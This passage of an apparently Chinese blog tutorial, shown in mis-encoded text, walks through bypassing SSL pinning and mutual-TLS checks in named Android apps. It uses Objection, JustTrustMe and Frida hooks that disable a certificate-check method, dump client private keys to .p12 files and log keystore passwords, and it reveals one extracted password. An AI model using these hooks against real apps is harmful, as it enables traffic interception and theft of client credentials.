href="https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js">https://github.com/WooyunDota/DroidSSLUnpinning/blob/master/ObjectionUnpinningPlus/hooks.js</a></p><p>4ã€ç”¨äº†å¤§ä½¬çš„è„šæœ¬åï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œè¿˜æ˜¯å¤±è´¥äº†ï¼Œåªèƒ½æ¢ä¸€ä¸ªå†è¯•è¯•äº†ï¼Œåˆå°è¯•äº†justtrustmeï¼Œåœ°å€ï¼š<a href="https://github.com/Fuzion24/JustTrustMe%EF%BC%8C%E7%BB%93%E6%9E%9C%E8%BF%98%E6%98%AF%E4%B8%8D%E8%A1%8C%E3%80%82">https://github.com/Fuzion24/JustTrustMeï¼Œç»“æœè¿˜æ˜¯ä¸è¡Œã€‚</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024431.webp" alt="img"> </p><p>5ã€åœ¨è¾—è½¬åä¾§ä¹‹æ—¶ï¼Œæˆ‘æƒ³èµ·ä¹‹å‰ç”¨ç®—æ³•åŠ©æ‰‹æ—¶ï¼Œé‡Œé¢å¸¦ç€ä¸€ä¸ªjusttruatmeçš„å‡çº§ç‰ˆï¼Œäºæ˜¯å°±æ‹¿æ¥è¯•äº†è¯•ï¼Œç»“æœæˆåŠŸæ‹¿ä¸‹ã€‚å¯ä»¥æ­£å¸¸è¿›è¡ŒæŠ“åŒ…äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024359.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081024428.webp" alt="img"> </p><p>6ã€ç»è¿‡ä¸Šè¿°å°è¯•ï¼Œæˆ‘ä»¬é’ˆå¯¹sslpinningè¿™ç§ï¼Œå¯ä»¥å…ˆç”¨å¸‚é¢ä¸Šå·²æœ‰çš„sslunpinningå·¥å…·è¿›è¡Œå°è¯•ï¼Œå¦‚æœé‡åˆ°éƒ½æ— æ³•è¿›è¡ŒæˆåŠŸçš„æƒ…å†µï¼Œé‚£å°±éœ€è¦æˆ‘ä»¬å»æ‰‹å·¥è¿›è¡Œhookäº†ã€‚å¤§è‡´æœ‰ä¸¤ç§æ€è·¯ï¼Œ<strong>ä¸€æ˜¯</strong>å¯¹æ‰€æœ‰HTTPå­—ç¬¦ä¸²ç›¸å…³ç±»è¿›è¡ŒHookï¼Œ<strong>äºŒæ˜¯</strong>è€ƒè™‘åˆ°Appåœ¨éªŒè¯è¯ä¹¦æ—¶ä¼šæ‰“å¼€è¯ä¹¦æ–‡ä»¶åˆ¤æ–­æ˜¯å¦æ˜¯Appè‡ªèº«æ‰€ä¿¡ä»»çš„ï¼Œå› æ­¤ä¸€å®šä¼šä½¿ç”¨Fileç±»çš„æ„é€ å‡½æ•°æ‰“å¼€è¯ä¹¦æ–‡ä»¶è·å¾—æ–‡ä»¶çš„å¥æŸ„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æµ‹è¯•æ—¶å¯ä»¥Hookä¸Šæ‰€æœ‰Fileç±»çš„æ„é€ å‡½æ•°ï¼Œå³å¯¹<strong>File.initå‡½æ•°è¿›è¡Œhookã€‚è¿™é‡Œæˆ‘ç”¨äº†objectionè¿›è¡Œhookçš„</strong>ï¼š<code>**objection -N -h 127.0.0.1 -p 26666 -g cn.ticktick.task explore -P ~/.objection/plugins -s &quot;android hooking watch class_method java.io.File.\init --dump-args --dump-backtrace --dump-return&quot;**</code>ï¼Œè¿™é‡Œå› ä¸º$åœ¨å‘½ä»¤è¡Œä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥ç”¨\å¯¹å®ƒè¿›è¡Œè½¬ä¹‰ï¼Œé¿å…è¢«å½“æˆå‘½ä»¤è¡Œå˜é‡ã€‚hookä¹‹åï¼Œæˆ‘ä»¬åœ¨å¾—åˆ°çš„æ•°æ®é‡Œé¢æœç´¢&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081057026.webp" alt="img"> </p><p>7ã€æˆ‘ä»¬åœ¨æœåˆ°çš„æ•°æ®é‡Œé¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå…³äºè¯ä¹¦çš„å †æ ˆä¿¡æ¯ï¼Œæˆ‘ä»¬ç”¨jadxåç¼–è¯‘åï¼Œæ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081057217.webp" alt="img"> </p><p>8ã€å¤åˆ¶ä¸€ä¸‹ï¼Œä¸¢ç»™chatgptåˆ†æä¸€ä¸‹ï¼Œå¾—å‡ºç»“è®ºï¼Œè¿™æ®µä»£ç æ˜¯å…³äºå¤„ç† SSL è¯ä¹¦éªŒè¯çš„é€»è¾‘ï¼Œæ˜¯åŸºäºåŸŸåå’Œè¯ä¹¦çš„å“ˆå¸Œå€¼è¿›è¡ŒåŒ¹é…ï¼Œæ£€æŸ¥ä¼ å…¥çš„è¯ä¹¦æ˜¯å¦ç¬¦åˆæŸäº›é¢„æœŸçš„æ ‡å‡†ï¼Œé‚£æˆ‘ä»¬å°è¯•hookå®ƒï¼Œå¹¶è®©å®ƒè¿”å›ç©ºï¼Œè¿™æ ·ä¸å°±èƒ½ç»•è¿‡è¯ä¹¦æ ¡éªŒäº†å˜›ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  Java.perform(function()&#123;</span><br><span class="line">    console.log(<span class="string">&quot;å¯åŠ¨&quot;</span>);</span><br><span class="line">    <span class="type">let</span> <span class="variable">f</span> <span class="operator">=</span> Java.use(<span class="string">&quot;ll.f&quot;</span>);</span><br><span class="line">    f[<span class="string">&quot;a&quot;</span>].implementation=function(str, list)&#123;</span><br><span class="line">      console.log(`f.a is called: str=$&#123;str&#125;, list=$&#123;list&#125;`);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main,<span class="number">500</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081058519.webp" alt="img"> </p><p>9ã€éå¸¸å¹¸è¿ï¼Œç»è¿‡hookåï¼Œæˆ‘ä»¬æˆåŠŸæŠ“åˆ°äº†è¿™ä¸ªæ•°æ®åŒ…ï¼Œè‡³æ­¤å®Œæˆã€‚</p><h1 id="ä¸‰ã€åŒå‘è¯ä¹¦æ ¡éªŒ-æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦"><a href="#ä¸‰ã€åŒå‘è¯ä¹¦æ ¡éªŒ-æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦" class="headerlink" title="ä¸‰ã€åŒå‘è¯ä¹¦æ ¡éªŒ-æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦"></a>ä¸‰ã€åŒå‘è¯ä¹¦æ ¡éªŒ-æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦</h1><p>åŒå‘è¯ä¹¦æ ¡éªŒ &#x3D; å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦+æœåŠ¡ç«¯æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦</p><p>1ã€è¿™æ˜¯ç¬¬ä¸‰ç§æƒ…å†µï¼Œæˆ‘ä»¬ä»¥xåˆ©èœ‚appä¸ºä¾‹ï¼Œè¿›è¡ŒæŠ“åŒ…å°è¯•ï¼Œç»è¿‡å°è¯•ï¼Œè¿˜æ˜¯å’Œä¹‹å‰ä¸€æ ·æŠ¥é”™ï¼šSSL handshake with client failed: An unknown issue occurred processing the certificate (certificate_unknown)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081100379.webp" alt="img"> </p><p>2ã€æˆ‘ä»¬å…ˆä½¿ç”¨objectionçš„android sslpinning disableæŠŠè¿™ä¸ªsslpinningè¿‡æ‰ï¼Œè¿‡æ‰ä¹‹åï¼Œæˆ‘ä»¬å†æŠ“åŒ…ï¼Œå‘ç°è¯·æ±‚æ­£å¸¸å‘å‡ºï¼Œå“åº”è¿”å›æŠ¥é”™ï¼š400 No required SSL certificate was sentã€‚åˆ¤æ–­ä¸ºæœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081100391.webp" alt="img"> </p><p>3ã€å½“æˆ‘ä»¬é‡åˆ°è¿™ç§æƒ…å†µï¼Œéœ€è¦æˆ‘ä»¬ä»appä¸­æ‰¾åˆ°å†…ç½®çš„å®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¯¼å…¥åˆ°æŠ“åŒ…å·¥å…·ä¸­ï¼Œæ‰èƒ½æ­£å¸¸è¿›è¡ŒæŠ“åŒ…ï¼Œé‚£æ€ä¹ˆæ‰èƒ½æ‰¾åˆ°å®¢æˆ·ç«¯çš„è¯ä¹¦å‘¢ï¼Ÿé€šå¸¸æ˜¯æœ‰äºŒç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç”¨r0ysueå¤§ä½¬å†™çš„r0captureè¿›è¡Œhookå¯¼å‡ºï¼Œç¬¬äºŒç§æ˜¯å»hook Keystoreï¼Œæ‰¾åˆ°åŠ è½½è¯ä¹¦çš„åœ°æ–¹ï¼Œæ‰‹åŠ¨åˆ†ææºç å»æ‰¾åˆ°è¯ä¹¦å’Œå¯†ç ã€‚æˆ‘ä»¬å…ˆç”¨ä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼šç›´æ¥ä¸Šr0captureï¼Œæœ‰æ£æ²¡æ£æ‰“ä¸€æ†å­è¯•è¯•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101423.webp" alt="img"> </p><p>4ã€è¿æ°”ä¸é”™ï¼Œè¯ä¹¦æ‰¾åˆ°äº†ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨dowloadç›®å½•ä¸‹æŠŠè¯ä¹¦æ‹¿å‡ºæ¥ï¼Œå®‰è£…åˆ°Charlesé‡Œã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101548.webp" alt="img"> </p><p>5ã€ç„¶åï¼Œå†æ¬¡è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸç»•è¿‡äº†åŒå‘è¯ä¹¦è®¤è¯ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081101165.webp" alt="img"> </p><p>6ã€æˆ‘ä»¬å»çœ‹ä¸€ä¸‹r0ysueå¤§ä½¬çš„è„šæœ¬ï¼Œç®€å•æ¥è§£é‡Šä¸€ä¸‹åŸç†ï¼š</p><p>åœ¨å®‰å“å¼€å‘ä¸­ï¼Œç³»ç»ŸåŒ…æ˜¯æ— æ³•æ··æ·†çš„ï¼Œä¾‹å¦‚java.security.KeyStoreä¸ä¼šè¢«æ··æ·†ï¼Œæ‰€ä»¥å¯ä»¥å»hookè¿™ä¸ªç±»ï¼Œå¹¶ä¸”åœ¨ Java ä¸­ï¼ŒKeyStore$PrivateKeyEntry æ˜¯å­˜å‚¨åœ¨ KeyStore ä¸­ï¼ŒåŒ…å«ç§é’¥å’Œå“åº”çš„è¯ä¹¦ï¼Œå³getPrivateKey() å’Œ getCertificateChain() è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´å½“åº”ç”¨ç¨‹åºè°ƒç”¨ getPrivateKey() æˆ– getCertificateChain() æ–¹æ³•æ¥è·å–ç§é’¥å’Œè¯ä¹¦æ—¶ï¼Œä¼šè¢«è„šæœ¬æ‹¦æˆªå¹¶æå–è¿”å›çš„ç§é’¥å’Œè¯ä¹¦æ•°æ®ï¼Œç„¶åstoreP12() å‡½æ•°ï¼Œå°†æå–çš„ç§é’¥å’Œè¯ä¹¦ç»„åˆèµ·æ¥ï¼Œå­˜å‚¨ä¸ºä¸€ä¸ª .p12 æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨å¯†ç r0ysueè¿›è¡ŒåŠ å¯†å¹¶å†™å…¥åˆ°æŒ‡å®šè·¯å¾„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">   <span class="keyword">function</span>  <span class="title function_">uuid</span>(<span class="params">len, radix</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> chars =<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">       <span class="keyword">var</span> uuid =[], i;</span><br><span class="line">        radix = radix || chars.<span class="property">length</span>;</span><br><span class="line">       <span class="keyword">if</span>(len)&#123;</span><br><span class="line">           <span class="comment">// Compact form</span></span><br><span class="line">           <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt; len; i++) uuid[i]= chars[<span class="number">0</span>| <span class="title class_">Math</span>.<span class="title function_">random</span>()* radix];</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="comment">// rfc4122, version 4 form</span></span><br><span class="line">           <span class="keyword">var</span> r;</span><br><span class="line">           <span class="comment">// rfc4122 requires these characters</span></span><br><span class="line">            uuid[<span class="number">8</span>]= uuid[<span class="number">13</span>]= uuid[<span class="number">18</span>]= uuid[<span class="number">23</span>]=<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            uuid[<span class="number">14</span>]=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">           <span class="comment">// Fill in random data. At i==19 set the high bits of clock sequence as</span></span><br><span class="line">           <span class="comment">// per rfc4122, sec. 4.1.5</span></span><br><span class="line">           <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">36</span>; i++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(!uuid[i])&#123;</span><br><span class="line">                    r =<span class="number">0</span>| <span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">16</span>;</span><br><span class="line">                    uuid[i]= chars[(i ==<span class="number">19</span>)?(r &amp;<span class="number">0x3</span>)|<span class="number">0x8</span>: r];</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> uuid.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">function</span>  <span class="title function_">storeP12</span>(<span class="params">pri, p7, p12Path, p12Password</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>)</span><br><span class="line">       <span class="keyword">var</span> p7X509 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(p7, X509Certificate);</span><br><span class="line">       <span class="keyword">var</span> chain = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>,[p7X509])</span><br><span class="line">       <span class="keyword">var</span> ks = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;PKCS12&quot;</span>,<span class="string">&quot;BC&quot;</span>);</span><br><span class="line">        ks.<span class="title function_">load</span>(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        ks.<span class="title function_">setKeyEntry</span>(<span class="string">&quot;client&quot;</span>, pri, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>(), chain);</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(p12Path);</span><br><span class="line">            ks.<span class="title function_">store</span>(out, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>())</span><br><span class="line">       &#125;<span class="keyword">catch</span>(exp)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(exp)</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">     <span class="comment">// åœ¨æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯çš„æƒ…å½¢ä¸‹ï¼Œå¸®åŠ©dumpå®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶ä¿å­˜ä¸ºp12çš„æ ¼å¼ï¼Œè¯ä¹¦å¯†ç ä¸ºr0ysue</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getPrivateKey</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> result =<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>()</span><br><span class="line">       <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">       <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(),<span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(),<span class="string">&#x27;/sdcard/Download/&#x27;</span>+ packageName +<span class="title function_">uuid</span>(<span class="number">10</span>,<span class="number">16</span>)+<span class="string">&#x27;.p12&#x27;</span>,<span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getCertificateChain</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> result =<span class="variable language_">this</span>.<span class="title function_">getCertificateChain</span>()</span><br><span class="line">       <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">       <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(),<span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(),<span class="string">&#x27;/sdcard/Download/&#x27;</span>+ packageName +<span class="title function_">uuid</span>(<span class="number">10</span>,<span class="number">16</span>)+<span class="string">&#x27;.p12&#x27;</span>,<span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>7ã€è¿™ä¸ªxåˆ©èœ‚çš„ä¾‹å­åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬å†æ‹¿å‡ºæŸLocationï¼Œå®ƒä¹Ÿæ˜¯åŒå‘è¯ä¹¦è®¤è¯ï¼Œè¿™æ¬¡æˆ‘ä»¬è‡ªå·±å»æ‰¾ä¸€ä¸‹è¯ä¹¦ï¼Œè¿˜æ˜¯ä¸€æ ·å¯åŠ¨charlesè¿›è¡ŒæŠ“åŒ…ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102509.webp" alt="img"> </p><p>8ã€å¯ä»¥çœ‹åˆ°ï¼ŒæŠ¥é”™å’Œä¹‹å‰æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡äº†ï¼Œè¿™ç§æ˜¯sslpinningçš„æƒ…å†µï¼Œæˆ‘ä»¬ç”¨objectionçš„android sslpinning disableæŠŠå®ƒè¿‡æ‰ï¼Œè¿‡æ‰ä¹‹åï¼Œå†é‡æ–°æŠ“åŒ…ï¼Œå‘ç°æŠ¥é”™å˜äº†ï¼Œè¯·æ±‚åŒ…æ­£å¸¸ï¼Œå“åº”åŒ…400çš„æƒ…å†µã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102305.webp" alt="img"> </p><p>9ã€è¿™ç§æƒ…å†µå°±æ˜¯åŒå‘è¯ä¹¦æ ¡éªŒäº†ï¼Œæˆ‘ä»¬éœ€è¦å»è§£åŒ…æ‰¾è¯ä¹¦æœç´¢.p12ï¼Œ.bksï¼Œ.pemï¼Œè¿˜æ˜¯ä¸€æ ·æ²¡æ‰¾åˆ°ï¼Œæˆ‘ä»¬åªèƒ½å»è„±å£³åç¼–è¯‘ä»£ç ï¼Œè¿™æ¬¡è„±å£³æˆ‘ç”¨çš„æ˜¯å¤§ä½¬ç»™åˆ†äº«çš„ä¸€ä¸ªè„±å£³ç½‘ç«™ï¼š<a href="https://nop.gs/">https://nop.gs/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081102604.webp" alt="img"> </p><p>10ã€ç„¶åæˆ‘ä»¬å»ä»£ç é‡Œæ‰¾æ‰¾çœ‹ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æœç´¢keystoreï¼Œå‘ç°å°±è¿™å‡ ä¸ªï¼Œè€Œä¸”å°±è¿™ä¿©è´§å¸¦ç€BKSçš„å…³é”®å­—æ ·ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103329.webp" alt="img"> </p><p>11ã€ç‚¹è¿›å»çœ‹çœ‹ï¼Œç»ˆäºçŸ¥é“ä¸ºå•¥æˆ‘è§£åŒ…åï¼Œæœç´¢å¸¸è§è¯ä¹¦åç¼€æœä¸ç€çš„åŸå› äº†ï¼ŒåŸæ¥æ˜¯ç”¨äº†å›¾ç‰‡åšè¯ä¹¦ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103499.webp" alt="img"> </p><p>12ã€è¯ä¹¦æ‰¾åˆ°äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾å¯†ç äº†ï¼Œæ€ä¹ˆæ‰¾å‘¢ï¼Ÿå½“ç„¶æ˜¯hookäº†ï¼Œä¸Šè„šæœ¬ã€‚ä¹‹å‰ä¹Ÿè¯´è¿‡äº†ï¼Œå› ä¸ºjava.security.KeyStoreæ˜¯ç³»ç»Ÿçš„ç±»æ˜¯ä¸ä¼šè¢«æ··æ·†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬hookå®ƒå°±è¡Œäº†ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg0</span>)&#123;</span><br><span class="line">           <span class="comment">// printStack(&quot;KeyStore.load1&quot;);</span></span><br><span class="line">           <span class="comment">// è¾“å‡ºè°ƒç”¨æ ˆ</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">           <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">       &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>,<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg0, arg1</span>)&#123;</span><br><span class="line">           <span class="comment">// printStack(&quot;KeyStore.load2&quot;);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1):<span class="literal">null</span>);</span><br><span class="line">           <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">       &#125;;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_KeyStore_load</span>()</span><br></pre></td></tr></table></figure><p>13ã€æ¥ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹hookçš„æ•ˆæœå¦‚ä½•ï¼Ÿhookå‡ºæ¥äº†ï¼Œå¯†ç æ˜¯lerist.key.2021ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081103334.webp" alt="img"> </p><p>14ã€ç„¶åæˆ‘ä»¬æŠŠè¯ä¹¦æ‹¿å‡ºæ¥ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104580.webp" alt="img"> </p><p>15ã€è¿™é‡Œæˆ‘ç”¨äº†keystore explorerå¯¹è¯ä¹¦è¿›è¡Œæ ¼å¼çš„è½¬æ¢ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104281.webp" alt="img"> </p><p>16ã€æˆ‘ä»¬å¾—æŠŠè¯ä¹¦è½¬æˆp12æ ¼å¼ï¼Œæ‰èƒ½åœ¨charlesé‡Œå®‰è£…ï¼Œå®‰è£…å®Œæˆåï¼Œè™½ç„¶æ˜¯åŠ å¯†å¾—ï¼Œä½†æ˜¯å¯ä»¥æ­£å¸¸æŠ“åŒ…äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081104880.webp" alt="img"> </p><h1 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>åœ¨Androidåº”ç”¨çš„æŠ“åŒ…è¿‡ç¨‹ä¸­ï¼Œå¤„ç†ä¸åŒç±»å‹çš„è¯ä¹¦éªŒè¯æœºåˆ¶çš„æ–¹æ³•æœ‰æ‰€ä¸åŒï¼š</p><ul><li><p>æ— è¯ä¹¦æ ¡éªŒï¼šå¦‚æœåº”ç”¨æ²¡æœ‰è¿›è¡Œè¯ä¹¦éªŒè¯ï¼Œæˆ‘ä»¬åªéœ€é…ç½®æŠ“åŒ…å·¥å…·çš„è¯ä¹¦å³å¯è¿›è¡ŒæŠ“åŒ…ã€‚</p></li><li><p>å•å‘è¯ä¹¦è®¤è¯ï¼ˆSSL Pinningï¼‰ï¼šå¯¹äºSSL Pinningçš„åº”ç”¨ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦ä½¿ç”¨Fridaç­‰å·¥å…·è¿›è¡Œhookï¼Œä»¥ç»•è¿‡SSL Pinningæœºåˆ¶ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦å°è¯•å¤šç§æ–¹æ³•ï¼Œå¦‚ä½¿ç”¨JustTrustMeè„šæœ¬ï¼Œæ‰èƒ½æˆåŠŸè¿›è¡ŒæŠ“åŒ…ã€‚</p></li><li><p>åŒå‘è¯ä¹¦è®¤è¯ï¼šå¯¹äºåŒå‘è¯ä¹¦è®¤è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨r0captureç›´æ¥dumpè¯ä¹¦ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»£ç ä¸­æ‰¾åˆ°è¯ä¹¦å’Œå¯†ç 